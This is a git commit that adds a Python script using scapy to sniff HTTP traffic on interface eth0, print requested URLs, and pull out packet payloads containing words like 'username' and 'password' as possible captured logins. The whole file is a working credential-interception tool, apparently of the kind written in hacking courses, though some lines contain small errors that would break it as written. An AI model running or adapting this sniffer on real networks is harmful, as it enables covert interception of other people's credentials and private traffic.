b75f2429e193986a6a0ab559f5a64849282ea22a
Mihai Soare <soaremihai.a@yahoo.com>
2022-11-23 01:18:32 +0200

    first commit

---
+++ main.py
@@ -0,0 +1,33 @@
+import scapy.all as scapy
+from scapy.layers import http
+
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+
+def get_website_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.raw):
+        load = packet[scapy.Raw].load
+        key_words = ["username", "user", "login", "password", "pass"]
+        for item in key_words:
+            if item in load:
+                return load
+
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        print(packet.show())
+        url = get_website_url(packet)
+        print(f"[+] HTTP Request >> {url.decode()}")
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print(f"\n\n[+] Possible username/password >> {login_info.decode()}\n\n")
+
+
+sniff("eth0")
